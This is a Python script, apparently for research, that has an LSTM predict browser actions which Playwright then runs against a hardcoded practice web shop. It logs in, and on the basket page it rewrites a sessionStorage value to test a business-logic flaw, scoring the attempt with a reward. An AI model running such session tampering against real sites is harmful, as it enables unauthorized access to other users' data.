import os
import time
import pickle
import numpy as np
import tensorflow as tf
from tensorflow.keras.models import load_model
from tensorflow.keras.preprocessing.sequence import pad_sequences
import asyncio
from playwright.async_api import async_playwright

# ----- Greedy Decoding Function -----
def greedy_decode(model, start_seq, encoder, pad_len, max_steps=20):
    seq = list(start_seq)
    eos_token_id = np.where(encoder.classes_ == "<EOS>")[0][0] if "<EOS>" in encoder.classes_ else None
    for _ in range(max_steps):
        seq_padded = pad_sequences([seq], maxlen=pad_len, padding="post")
        preds = model.predict(seq_padded, verbose=0)[0]
        next_token = int(np.argmax(preds))
        seq.append(next_token)
        if eos_token_id is not None and next_token == eos_token_id:
            break
    return seq

# ----- Token Parsing Function -----
def parse_token(token):
    """
    Expects token in the format: "url | selector | action"
    Returns a tuple: (url, selector, action)
    """
    parts = token.split(" | ")
    if len(parts) >= 3:
        url = parts[0].strip()
        selector = parts[1].strip()
        action = parts[2].strip().lower()
        return url, selector, action
    return None, None, None

# ----- Dummy Reward Function with Sequence Checking -----
def calculate_reward_with_sequence(action, selector, page, predicted_token, expected_token):
    if action == "input":
        base_reward = 10
    elif action == "click":
        base_reward = 5
    elif action == "manipulation":
        base_reward = 8
    else:
        base_reward = 2
    if predicted_token == expected_token:
        seq_reward = 10
    else:
        seq_reward = -5
    return base_reward + seq_reward

# ----- Continuous Playwright Execution with Experience Storage and Sequence Checking -----
async def continuous_execute_actions(final_sequence, base_url="https://tingkingsushi.ddns.net/#"):
 
    expected_sequence = [
        "/login | input#email | input",
        "/login | input#password | input",
        "/login | button#loginButton | click",
        "/search | button.mat-focus-indicator.buttons.mat-button.mat-button-base.ng-star-inserted | click" ,
        "/basket | body | manipulation"
    ]
    expected_index = 0

    experiences = []
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        page = await browser.new_page()
        total_reward = 0
        previous_token = None

        for token in final_sequence:
            if token == "<EOS>":
                print("EOS token reached. Ending interaction.")
                break
            if token == previous_token:
                continue
            previous_token = token

            url, selector, action = parse_token(token)
            if not selector:
                selector = "#default-selector"

            # If the parsed URL starts with "#", prepend the base URL.
            if url.startswith("/"):
                full_url = base_url + url
            else:
                full_url = url

            expected_token = expected_sequence[expected_index] if expected_index < len(expected_sequence) else None

            # Navigate if needed, waiting until the page loads.
            if page.url != full_url:
                await page.goto(full_url, wait_until="load")
                time.sleep(1)

            print(f"Executing: action='{action}', selector='{selector}', URL='{full_url}'")
            try:
                if action == "click":
                    await page.click(selector)
                elif action == "input":
                    if "email" in selector.lower():
                        await page.fill(selector, "user@example.com")
                    elif "password" in selector.lower():
                        await page.fill(selector, "password123")
                    else:
                        await page.fill(selector, "test input")
                elif action == "manipulation":
                    # Dynamically scrape sessionStorage keys
                    session_keys = await page.evaluate("() => Object.keys(sessionStorage)")
                    print(f"Session storage keys: {session_keys}")
                    if session_keys:
                        target_key = session_keys[0]  # or use your own selection logic
                        new_value = "7"  # new value for demonstration
                        print(f"Updating sessionStorage key '{target_key}' to '{new_value}'")
                        await page.evaluate(f"() => {{ sessionStorage['{target_key}'] = '{new_value}'; }}")
                        await page.reload(wait_until="load")
                        # time.sleep(5)
                    else:
                        print("[!] No sessionStorage keys found; skipping manipulation.")
                else:
                    await page.click(selector)
            except Exception as e:
                print(f"[!] Error executing {action} on {selector}: {e}")

            await asyncio.sleep(1)

            # Reward logic: if the predicted token matches expected, reward; otherwise, penalty.
            step_reward = 5  # fallback reward
            if expected_token and token == expected_token:
                step_reward = 20
                expected_index += 1
            else:
                step_reward = -5
            total_reward += step_reward
            print(f"Reward for this step: {step_reward}")

            experiences.append({
                "token": token,
                "action": action,
                "selector": selector,
                "url": full_url,
                "reward": step_reward,
                "expected_token": expected_token
            })

        print("Total reward accumulated:", total_reward)

        # After the loop, before closing the browser:
        if expected_index >= len(expected_sequence):
            print("Attack successful! Injecting message...")
            await page.evaluate("""
            () => {
                const messageDiv = document.createElement('div');
                messageDiv.style.position = 'fixed';
                messageDiv.style.top = '50%';
                messageDiv.style.left = '50%';
                messageDiv.style.transform = 'translate(-50%, -50%)';
                messageDiv.style.backgroundColor = 'red';
                messageDiv.style.color = 'white';
                messageDiv.style.fontSize = '24px';
                messageDiv.style.textAlign = 'center';
                messageDiv.style.padding = '15px';
                messageDiv.style.zIndex = '99999';
                messageDiv.textContent = '⚠️ BUSINESS LOGIC FLAW DETECTED!';
                document.body.appendChild(messageDiv);
            }
            """)

            print("Business Logic Flaw Detected!")

            await asyncio.sleep(5)  # Give time to see the message before closing
        await browser.close()

    return experiences

# ----- End-to-End Demo Function -----
def run_end_to_end_demo():
    seq_file = "resource/lstm_sequences.npy"
    enc_file = "resource/encoder.pkl"
    model_file = "resource/lstm_model.h5"
    if not os.path.exists(seq_file) or not os.path.exists(enc_file) or not os.path.exists(model_file):
        print("Required training files missing. Please run your training pipeline first.")
        return

    model = load_model(model_file)
    with open(enc_file, "rb") as f:
        encoder = pickle.load(f)

    X_data = np.load(seq_file)  # Shape: (num_sequences, sequence_length)
    start_seq = X_data[0]  # Use the first sequence for demo
    pad_len = X_data.shape[1]

    predicted_indices = greedy_decode(model, start_seq, encoder, pad_len, max_steps=20)
    decoded_tokens = encoder.inverse_transform(np.array(predicted_indices))
    final_sequence = [token for token in decoded_tokens if token != "<PAD>"]
    print("Final predicted sequence:", final_sequence)

    experiences = asyncio.run(continuous_execute_actions(final_sequence))
    print("Collected experiences:")
    for exp in experiences:
        print(exp)

    buffer_path = "resource/experience_buffer.pkl"

    # Load previous experience buffer if it exists
    if os.path.exists(buffer_path):
        with open(buffer_path, "rb") as f:
            previous_experiences = pickle.load(f)
    else:
        previous_experiences = []

    # Add new experiences to the buffer
    previous_experiences.extend(experiences)

    # Save updated experience buffer
    with open(buffer_path, "wb") as f:
        pickle.dump(previous_experiences, f)

    print("Updated experience buffer saved.")

if __name__ == "__main__":
    run_end_to_end_demo()
